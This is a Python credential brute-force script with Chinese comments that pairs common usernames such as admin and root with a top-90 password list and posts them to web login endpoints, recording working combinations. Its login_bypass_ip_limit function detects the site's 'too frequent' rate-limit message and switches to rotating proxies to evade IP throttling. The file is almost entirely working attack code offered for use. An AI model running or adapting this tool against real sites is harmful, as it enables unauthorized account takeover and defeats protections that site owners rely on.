import requests

from bs4 import BeautifulSoup
from queue import Queue
from bruteforce import bruteforce, success_queue, dict_queue

import settings
import utils
import time



def login():
    """
    登录和检测登录结果的代码针对每个网站分别完成
    login_info中保存了登录所需要的所有信息，可以是用户名密码组合，可以是单纯的密码
    :return:
    """
    try:
        login_info = dict_queue.get(block=False)
    except :
        return

    username = login_info[0]
    password = login_info[1]

    ################################实现登录过程开始
    payload = {
        "username": username,
        "password": password,
        "recaptcha": ''
    }
    r = requests.post("http://127.0.0.1/api/login", json=payload)
    # r = requests.post("https://httpbin.org/post", data=payload)
    # 判断是否登录成功
    # print(r.text)
    ##################################实现登录过程结束

    ##################################检查密码是否正确开始
#    if True:
    if r.status_code == 200:  # 根据实际情况修改此处，判定登录成功
        msg = login_info
        # 登录成功则把登录信息保存到success_queue
        success_queue.put(msg)
        print(msg)

    ################################## 检查密码是否正确结束

CUR_PROXY = None
def login_bypass_ip_limit(login_url,username,password):
    """
    针对限制了ip访问次数的登录进行爆破
    :return:
    """
    # 开始登录
    global CUR_PROXY
    payload = {
        "username": username,
        "password": password,
    }
    print('开始尝试用户名：{},密码:{}'.format(username,password))

    S = requests.Session()
    while True:
        try:
            response = S.post(login_url,data=payload, proxies = CUR_PROXY, timeout = 5)
            if response.status_code == 200:
                # 正常获取到了服务器请求
                soup = BeautifulSoup(response.text,'lxml')
                if soup.find('span', text='对不起，您的访问过于频繁，请等待60秒后再操作！'):
                    # 捕获到了限制信息，改用代理登录
                    print("被限制了")
                    CUR_PROXY = utils.get_proxy()
                    print("当前使用代理:{}".format(CUR_PROXY))
                    continue
                elif soup.find('a', attrs={'id':'backdoor'}):
                    # 用户名密码正确，成功登录
                    print("登录成功")
                    success_queue.put(payload)
                    return True
                elif soup.find('span',text='用户名或密码错误！'):
                    print("用户名或密码错误")
                    return False
            else:
                print("连接异常")
                print(response.text)

        except requests.exceptions.ConnectionError:
            print("代理不可用,更换代理")
            CUR_PROXY = utils.get_proxy()
            print("当前使用代理:{}".format(CUR_PROXY))
        except requests.exceptions.Timeout:
            print("代理连接速度过慢，更换代理！")
            CUR_PROXY = utils.get_proxy()
            print("当前使用代理:{}".format(CUR_PROXY))

        except:
            print('未知情况')

def get_dict():
    """
    生成字典队列
    :return:
    """
    with open("dict/top_90.txt") as f:
        passwords = f.readlines()

    passwords = [line.strip() for line in passwords]

    username = ['admin', 'rot', 'user', 'a', 'b', 'c', 'd', 'e', 'f', 'a', 'fa', 'root']

    count = 0
    for u in username:
        for p in passwords:
            count += 1
            pair = (u, p)
            dict_queue.put(pair)
    print("字典生成完成，长度 {}".format(count))


if __name__ == "__main__":
    get_dict()
    # bruteforce(login, thread_num=3)
    while True:
        try:
            login_info = dict_queue.get(block=False)
        except :
            pass

        username = login_info[0]
        password = login_info[1]

        res = login_bypass_ip_limit(settings.LOGIN_LIMIT_IP_URL,username,password)

